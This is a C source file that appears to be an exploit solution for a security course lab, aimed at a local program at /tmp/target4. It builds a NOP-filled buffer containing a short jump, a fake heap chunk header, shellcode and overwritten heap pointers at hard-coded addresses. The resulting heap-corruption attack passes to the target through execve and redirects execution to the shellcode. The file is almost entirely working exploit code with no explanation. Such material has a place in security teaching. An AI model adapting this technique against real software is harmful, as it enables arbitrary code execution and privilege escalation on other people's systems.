#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#define TARGET "/tmp/target4"
#define NOP 0x90
#define OFFSET 200 // 0x08059948 - 0x08059878 - 8
#define Q_POINTER 0x08059948
#define P_POINTER 0x08059878
#define B_SIZE 1024;


int main(void)
{
  char *args[3];
  char *env[1];
  int bsize = B_SIZE;
  int fake_right, i;
  long *addr_ptr;
  char buff[bsize];



addr_ptr = (long *) buff;
fake_right = 0xbffffa7d;// Any number with less significant bit 1

//setting NOP to Array
for (i = 0; i < bsize; i++) {
buff[i] = NOP;
}
//Jumping to the shellcode, passing through the fake_right
char *jmp = "\xeb\x06";
memcpy(buff,jmp, strlen(jmp));

*(addr_ptr +1) = fake_right;


memcpy (buff + 8, shellcode, strlen(shellcode));

*(int*)(buff + OFFSET) = 0x08059878;//0x08059878;
*(int*)(buff + OFFSET +4) = 0xbffffa7c;

buff[1023] = '\x00';

  args[0] = TARGET;
  args[1] = buff;
  args[2] = NULL;
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
